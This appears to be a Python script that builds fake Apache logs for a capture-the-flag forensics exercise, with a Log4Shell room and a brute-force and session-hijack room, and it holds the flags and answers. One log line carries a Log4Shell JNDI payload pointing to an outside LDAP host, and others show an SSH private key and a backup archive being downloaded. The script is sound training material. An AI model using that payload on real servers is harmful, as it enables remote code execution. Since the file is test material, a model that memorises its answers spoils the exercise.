# create_new_log.py
import os
import base64
import random
from datetime import datetime, timedelta

# --- General Setup ---
BASE_DIR = os.path.dirname(__file__)
LOG_DIR = os.path.join(BASE_DIR, "server", "static", "rooms", "web-logs-1")
os.makedirs(LOG_DIR, exist_ok=True)


# --- Log Generator Utility ---
def generate_log_content(filename, content_list, repeat_count=1):
    log_path = os.path.join(LOG_DIR, filename)
    print(f"[*] Generating {filename}...")
    try:
        with open(log_path, "w", encoding="utf-8") as f:
            f.write("".join(content_list) * repeat_count)
        print(
            f"[+] {filename} created successfully. Size: {os.path.getsize(log_path) / 1024 / 1024:.2f} MB"
        )
        return log_path
    except Exception as e:
        print(f"[!] ERROR creating {filename}: {e}")
        sys.exit(1)


# --- ROOM 1: LOG4SHELL ATTACK (Apache Format) ---
LOG1_FILENAME = "ctf_attack_log4shell.log"
# Flags/Answers for this log (Same as previous, for q1-q6)
LOG1_CONTENT = """
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${{jndi:ldap://167.99.196.188:1389/flag{th1s_is_th3_h1dd3n_l0g4sh3ll_fl4g}}} HTTP/1.1" 400 500 "-" "curl/7.64.1"
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"
"""

# --- ROOM 2: FORENSICS ATTACK (Apache Format) ---
LOG2_FILENAME = "ctf_forensics_hijack.log"

# Answers for new room (q7-q10)
FLAG_COOKIE = "U3RybWFibGVTYW5kc3Rvcm0="  # Decoded: StreamableSandstorm
FLAG_IP_TOR = "185.220.101.40"
FLAG_EXFIL_PAGE = "/api/v1/user/settings"

# Brute-force block (1000 unsuccessful attempts)
brute_force_ip = "20.12.33.4"
brute_content = []
start_time = datetime(2025, 11, 2, 14, 0, 0)
for i in range(1000):
    timestamp = start_time + timedelta(seconds=i * 0.05)
    brute_content.append(
        f"{brute_force_ip} - - [{timestamp.strftime('%d/%b/%Y:%H:%M:%S +0000')}] \"POST /login HTTP/1.1\" 401 120 \"-\" \"python-requests/2.28.1\"\n"
    )

# Session Hijack & Exfil (Success)
hijack_content = [
    # Success after the brute force
    f'{brute_force_ip} - - [02/Nov/2025:14:02:00 +0000] "POST /login HTTP/1.1" 200 800 "-" "python-requests/2.28.1"\n',
    # Session Cookie Hijack attempt
    f'{FLAG_IP_TOR} - - [02/Nov/2025:14:02:10 +0000] "GET {FLAG_EXFIL_PAGE} HTTP/1.1" 200 500 "-" "Mozilla/5.0 (Tor Browser)" - COOKIE: {FLAG_COOKIE}\n',
]

# Random Noise
noise = [
    f'192.168.1.{random.randint(10,20)} - - [02/Nov/2025:14:03:00 +0000] "GET /images/item{i}.jpg HTTP/1.1" 200 4500 "-" "Mozilla/5.0"\n'
    for i in range(50)
]

FULL_LOG1 = [LOG1_CONTENT] * 50
FULL_LOG2 = brute_content + hijack_content + noise * 10
# --- END OF LOG CONTENT ---

print("--- NEW LOG FILE GENERATION ---")
# 1. Log4Shell Log
generate_log_content(LOG1_FILENAME, FULL_LOG1, repeat_count=1)

# 2. Forensics Log
generate_log_content(LOG2_FILENAME, FULL_LOG2, repeat_count=1)

print("\n!!! DON'T FORGET TO RUN: python server/app.py !!!")
